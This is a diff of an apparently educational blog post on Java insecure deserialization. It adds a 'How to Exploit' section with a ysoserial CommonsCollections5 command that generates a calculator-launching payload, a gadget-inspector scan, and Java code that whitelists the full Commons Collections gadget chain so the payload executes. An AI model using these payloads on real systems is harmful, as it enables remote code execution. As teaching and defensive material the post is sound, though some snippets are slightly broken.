@@ -76,13 +76,11 @@
 
 <h2>Serialization</h2>
 
-<p>The fundamental <code>purpose</code> of serialization is to <code>convert</code> the <code>data structure</code> (i.e state of an object) into a <code>format</code> (for example: <code>byte stream</code>) that can be <code>stored</code> and <code>transmitted</code> over a network link for future <code>consumption</code>.</p>
-
-<p>Not serialize => <code>transient</code>, <code>static</code> data fields.</p>
-
 <blockquote><p>Serializable is a <strong>marker interface</strong>. It has no <code>data member</code> and <code>method</code>.</p>
 
 <p>It is used to “mark" java classes so that objects of these classes may get certain capability.</p></blockquote>
+
+<p>The fundamental <code>purpose</code> of serialization is to <code>convert</code> the <code>data structure</code> (i.e state of an object) into a <code>format</code> (for example: <code>byte stream</code>) that can be <code>stored</code> and <code>transmitted</code> over a network link for future <code>consumption</code>.</p>
 
 <p><strong>Example</strong>:</p>
 
@@ -315,9 +313,9 @@
 <h2>Impact</h2>
 
 <ul>
-<li>Remote code execution through property oriented programming / Gadget Chaining.</li>
+<li>Remote code execution through property oriented programming(i.e <code>POP</code>) / Gadget Chaining.</li>
 <li>Bypass authorization / escalate privilege via Insecure Direct Object Reference if the signature of that object is not verified.</li>
-<li>DoS => consuming Heap memory.</li>
+<li>DoS like consuming the <code>Heap</code> memory.</li>
 </ul>
 
 
@@ -446,27 +444,29 @@
 <span class='line-number'>28</span>
 <span class='line-number'>29</span>
 <span class='line-number'>30</span>
+<span class='line-number'>31</span>
 </pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
 </span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
 </span><span class='line'>
 </span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">BasicDosDeserialize</span> <span class="o">{</span>
 </span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
 </span><span class='line'>        <span class="c1">// argument: base64 serialized obj as command line</span>
-</span><span class='line'>        <span class="kt">byte</span><span class="o">[]</span> <span class="n">planetBytes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
-</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;rO0AB&quot;</span><span class="o">))</span> <span class="o">{</span>  <span class="c1">// check for the signature</span>
-</span><span class='line'>            <span class="n">planetBytes</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="na">getBytes</span><span class="o">());</span>
+</span><span class='line'>        <span class="kt">byte</span><span class="o">[]</span> <span class="n">userBytes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span>
+</span><span class='line'>        <span class="k">if</span> <span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;rO0AB&quot;</span><span class="o">))</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">userBytes</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">args</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="na">getBytes</span><span class="o">());</span>
 </span><span class='line'>        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
-</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;\n bad format !!\n&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;\nCaught an exception... Invalid object?\n&quot;</span><span class="o">);</span>
 </span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">exit</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
 </span><span class='line'>        <span class="o">}</span>
-</span><span class='line'>
-</span><span class='line'>        <span class="n">ByteArrayInputStream</span> <span class="n">bIn</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ByteArrayInputStream</span><span class="o">(</span><span class="n">planetBytes</span><span class="o">);</span>
+</span><span class='line'>        <span class="n">ByteArrayInputStream</span> <span class="n">bIn</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ByteArrayInputStream</span><span class="o">(</span><span class="n">userBytes</span><span class="o">);</span>
 </span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
 </span><span class='line'>            <span class="n">ObjectInputStream</span> <span class="n">oIn</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ObjectInputStream</span><span class="o">(</span><span class="n">bIn</span><span class="o">);</span>
-</span><span class='line'>            <span class="n">Planet</span> <span class="n">planet</span> <span class="o">=</span> <span class="o">(</span><span class="n">User</span><span class="o">)</span> <span class="n">oIn</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>  <span class="c1">// actual deserialization, exceptng User object</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;here&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">User</span> <span class="n">asinha</span> <span class="o">=</span> <span class="o">(</span><span class="n">User</span><span class="o">)</span> <span class="n">oIn</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>  <span class="c1">// actual deserialization</span>
+</span><span class='line'>
 </span><span class='line'>            <span class="n">oIn</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
 </span><span class='line'>            <span class="n">bIn</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
-</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">planet</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">asinha</span><span class="o">);</span>
 </span><span class='line'>
 </span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="o">|</span> <span class="n">ClassNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
 </span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">();</span>
@@ -517,13 +517,40 @@
 <h2>How to Identify the Bug</h2>
 
 <ol>
-<li><p>From Blackbox perceptive, check for <code>rO0A</code> / <code>AC ED 00 05</code> magic numbers.</p></li>
+<li><p>From Blackbox perceptive:</p>
+
+<ul>
+<li>Check for <code>AC ED 00 05</code> or <code>rO0A</code> (base64 encoded format) magic numbers in request / response, to know that the application deals with a <code>serialized</code> object.</li>
+</ul>
+</li>
 <li><p><code>Content-type</code> header of an HTTP response set to <code>application/x-java-serialized-object</code>.</p></li>
-<li><p>From Whitebox perceptive, check the Java Serialization APIs such as <code>ObjectInputStream</code> with <code>readObject</code>.</p></li>
+<li><p>From Whitebox perceptive:</p>
+
+<ul>
+<li>Search for the Java Serialization APIs such as <code>ObjectInputStream</code> with <code>readObject</code> keywords through out the code base and check how the <code>ObjectInputStream</code> is used.</li>
+<li>Before the <code>readObject()</code> method call, does the code check for all expected classes from the <code>serialized</code> object through a <code>whitelist</code>.</li>
+</ul>
+</li>
 </ol>
 
 
-<h2>How to Prevent</h2>
+<h2>How to Exploit</h2>
+
+<p>From the blackbox angle, use <code>ysoserial.jar</code> and iterate different payloads to generate the serialized object.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 gnome-calculator &gt; /root/code-dev/java/demo_insecure_deserialization/Serialization/bad_serialized_object_ysoserial.ser
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Alternate:</p>
+
+<ul>
+<li>Burp Suite Plug-in: <a href="https://blog.netspi.com/java-deserialization-attacks-burp/">Java Serial Killer</a></li>
+</ul>
+
+
+<h2>How to Fix</h2>
 
 <ol>
 <li>Don’t blindly accept serialized objects from <code>untrusted</code> sources. Implement integrity check / sign the serialized object to prevent hostile object creation / tampering.</li>
@@ -546,14 +573,64 @@
 <span class='line-number'>6</span>
 <span class='line-number'>7</span>
 <span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">String</span> <span class="n">fname</span> <span class="o">=</span> <span class="s">&quot;../Serialization/bad_serialized_object.ser&quot;</span><span class="o">;</span>
-</span><span class='line'><span class="n">FileInputStream</span> <span class="n">fin</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">FileInputStream</span><span class="o">(</span><span class="n">fname</span><span class="o">);</span>
-</span><span class='line'><span class="n">Set</span> <span class="n">whitelist</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="s">&quot;User&quot;</span><span class="o">,</span>
-</span><span class='line'>                                                  <span class="s">&quot;OtherExpectedObject01&quot;</span><span class="o">,</span>
-</span><span class='line'>                                                  <span class="s">&quot;OtherExpectedObject02&quot;</span>
-</span><span class='line'>                                                 <span class="o">));</span>
-</span><span class='line'><span class="n">ObjectInputStream</span> <span class="n">oin</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">SafeObjectInputStream</span><span class="o">(</span><span class="n">fin</span><span class="o">,</span> <span class="n">whitelist</span><span class="o">);</span>
-</span><span class='line'><span class="n">User</span> <span class="n">a</span> <span class="o">=</span> <span class="o">(</span><span class="n">User</span><span class="o">)</span> <span class="n">oin</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">BasicDeserialize</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="c1">// fix 1: a blacklist based approach where the InvokerTransformer is blocked</span>
+</span><span class='line'>            <span class="c1">// however this can be bypassed by discovering a new gadget chains</span>
+</span><span class='line'>            <span class="c1">// in current Java, by default enableUnsafeSerialization is set to &#39;false&#39;</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;false&quot;</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">String</span> <span class="n">fname</span> <span class="o">=</span> <span class="s">&quot;../Serialization/bad_serialized_object.ser&quot;</span><span class="o">;</span>  <span class="c1">// evil object</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// fix 2: a whitelist based approach, resolve the class from the serialized object and verify with a whitelist set of expected classes.</span>
+</span><span class='line'>            <span class="n">Set</span> <span class="n">whitelist</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="s">&quot;User&quot;</span><span class="o">));</span>  <span class="c1">// here we only except User class</span>
+</span><span class='line'>            <span class="n">ObjectInputStream</span> <span class="n">oin</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">SafeObjectInputStream</span><span class="o">(</span><span class="n">fin</span><span class="o">,</span> <span class="n">whitelist</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// expecting a User type obj, actual deserialization happens here</span>
+</span><span class='line'>            <span class="n">User</span> <span class="n">u</span> <span class="o">=</span> <span class="o">(</span><span class="n">User</span><span class="o">)</span> <span class="n">oin</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">oin</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">fin</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;The object was read from &quot;</span> <span class="o">+</span> <span class="n">fname</span> <span class="o">+</span> <span class="s">&quot;:&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">u</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">();</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
@@ -624,6 +701,27 @@
 
 
 <blockquote><p>DoS is unavoidable if the expected object type is HashSet / HashMap / arraylist.</p></blockquote>
+
+<h2>How to inspects Java libraries and classpaths for gadget chains</h2>
+
+<p><strong>Automated approach</strong>: In order to find the existance of one / more gadget chains, run <code>Gadget Inspector</code> on all libraries (i.e <code>commons-collections-3.2.2.jar</code>) present in the Java classpaths.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="n">java</span> <span class="o">-</span><span class="n">Xmx2G</span> <span class="o">-</span><span class="n">jar</span> <span class="n">build</span><span class="o">/</span><span class="n">libs</span><span class="o">/</span><span class="n">gadget</span><span class="o">-</span><span class="n">inspector</span><span class="o">-</span><span class="n">all</span><span class="o">.</span><span class="na">jar</span> <span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">code</span><span class="o">-</span><span class="n">dev</span><span class="o">/</span><span class="n">java</span><span class="o">/</span><span class="n">JavaExternalLibs</span><span class="o">/</span><span class="n">commons</span><span class="o">-</span><span class="n">collections</span><span class="o">-</span><span class="mf">3.2</span><span class="o">.</span><span class="mi">2</span><span class="o">.</span><span class="na">jar</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The tool found 1 <code>gadget chains</code> and saved the result in <code>gadget-chains.txt</code>.</p>
+
+<p><img src="/downloads/code/2019/java_insecure_deserialization/gadget-inspector.png" alt="" /></p>
+
+<p><strong>Limitation of the tool</strong>:</p>
+
+<ul>
+<li>Not always an <code>exploit</code> can be build from the result.</li>
+<li>Can produce <code>false negative</code> result.</li>
+</ul>
+
 
 <h2>Demystifying a Known Gadget Chain</h2>
 
@@ -899,7 +997,7 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Initializing a <code>ConstantTransformar</code> with <code>Runtime.class</code> so that we we call <code>transform()</code> method with any object it returns the same <code>Runtime.class</code>.</p>
+<p>Initializing a <code>ConstantTransformar</code> with <code>Runtime.class</code> so that we can call the <code>transform()</code> method with any object and expecting <code>Runtime.class</code> returns type.</p>
 
 <h3>InvokerTransformer</h3>
 
@@ -1150,7 +1248,7 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<blockquote><p>In order to trigger command execution, somehow we need to execute <code>ChainedTransformer.transform("any_key”)</code> method.</p></blockquote>
+<blockquote><p>In order to trigger the command execution, somehow we need to execute <code>ChainedTransformer.transform("any_key")</code> method.</p></blockquote>
 
 <h3>HashMap</h3>
 
@@ -1218,7 +1316,7 @@
 <h3>LazyMap</h3>
 
 <ol>
-<li>A type of &lsquo;Map&rsquo; which <code>creates</code> a <code>value</code> if there’s <code>no</code> value is present for the <code>requested</code> key.</li>
+<li>A type of <code>Map</code> which <code>creates</code> a <code>value</code> if there’s <code>no</code> value is present for the <code>requested</code> key.</li>
 <li>This <code>generation</code> is done through a <code>transformation</code> (i.e transformer.<code>transform()</code> method) on the requested <code>Key</code>.</li>
 <li><strong>Key Point:</strong> <code>lazyMap.get("invalid_key")</code> calls <code>transformer.transform("invalid_key")</code> method when the key is not found.</li>
 </ol>
@@ -1564,7 +1662,7 @@
 <h3>Recap</h3>
 
 <ol>
-<li>Create a <code>TiedMapEntry</code> with a underlying <code>lazyMap</code> and key is String -> &lsquo;invalid_key&rsquo;.</li>
+<li>Create a <code>TiedMapEntry</code> with a underlying <code>lazyMap</code> and key is <code>String</code> -> &lsquo;invalid_key&rsquo;.</li>
 </ol>
 
 
@@ -1979,12 +2077,136 @@
 
 <p><a href="https://vimeo.com/374834418"><img src="/downloads/code/2019/java_insecure_deserialization/image-20191121223509399.png" alt="Demystifying a Gadget Chain - Java Deserialization" /></a></p>
 
+<h2>Final Thoughts</h2>
+
+<p>If we fix our code and use the <code>safeObjectInputStream</code> during deserialization, then following things will happen while unwrapping the serialized object:</p>
+
+<ol>
+<li>First, it resolves the <code>HashBag</code> Class.</li>
+<li><p>Then it checks if that class is present inside the <code>whitelist</code>.</p>
+
+<ul>
+<li>If that class <code>IS_FOUND</code> then it tries to resolves the next class which is <code>TiedMapEntry</code> and repeats the step 2.</li>
+<li>If any class <code>IS_NOT_FOUND</code> inside the <code>whitelist</code> then it throws <code>Exception</code>.</li>
+</ul>
+</li>
+<li><p>The entire process will be continued and we can anticipate the <code>calculator</code> if all classes wrapped in the <code>serialized</code> object are present inside the <code>whitelist</code>.</p></li>
+</ol>
+
+
+<p>So if we would like to run the <code>calculator</code> again then <code>whitelist</code> the following classes.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.HashSet</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Set</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">SafeDeserializeRCE</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;true&quot;</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// file name of the deserialized object</span>
+</span><span class='line'>            <span class="n">String</span> <span class="n">fname</span> <span class="o">=</span> <span class="s">&quot;../Serialization/bad_serialized_object.ser&quot;</span><span class="o">;</span>
+</span><span class='line'>            <span class="n">FileInputStream</span> <span class="n">fin</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">FileInputStream</span><span class="o">(</span><span class="n">fname</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// whitelist all classes for RCE</span>
+</span><span class='line'>            <span class="n">Set</span> <span class="n">rce_whitelist</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="s">&quot;org.apache.commons.collections.bag.HashBag&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.keyvalue.TiedMapEntry&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.map.LazyMap&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.functors.ChainedTransformer&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;[Lorg.apache.commons.collections.Transformer;&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.functors.ConstantTransformer&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;java.lang.Runtime&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;[Ljava.lang.Object;&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;[Ljava.lang.Class;&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;java.lang.String&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;java.lang.Object&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;[Ljava.lang.String;&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;java.lang.Integer&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;java.lang.Number&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;java.util.HashMap&quot;</span><span class="o">));</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">ObjectInputStream</span> <span class="n">oin</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">SafeObjectInputStream</span><span class="o">(</span><span class="n">fin</span><span class="o">,</span> <span class="n">rce_whitelist</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// expecting a User type obj, actual deserialization happens here</span>
+</span><span class='line'>            <span class="n">User</span> <span class="n">a</span> <span class="o">=</span> <span class="o">(</span><span class="n">User</span><span class="o">)</span> <span class="n">oin</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">oin</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">fin</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;\nThe object was read from &quot;</span> <span class="o">+</span> <span class="n">fname</span> <span class="o">+</span> <span class="s">&quot;:&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">a</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">();</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
 <h2>Reference</h2>
 
 <ul>
 <li><a href="https://speakerdeck.com/dhavalkapil/magichat-insomnihack-teaser-2018-writeup">https://speakerdeck.com/dhavalkapil/magichat-insomnihack-teaser-2018-writeup</a></li>
 <li><a href="https://www.youtube.com/watch?v=t-zVC-CxYjw&amp;t=1206s">https://www.youtube.com/watch?v=t-zVC-CxYjw&amp;t=1206s</a></li>
 <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html</a></li>
+<li><a href="https://github.com/JackOfMostTrades/gadgetinspector">https://github.com/JackOfMostTrades/gadgetinspector</a></li>
+<li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java</a></li>
 </ul>
 
 </div>
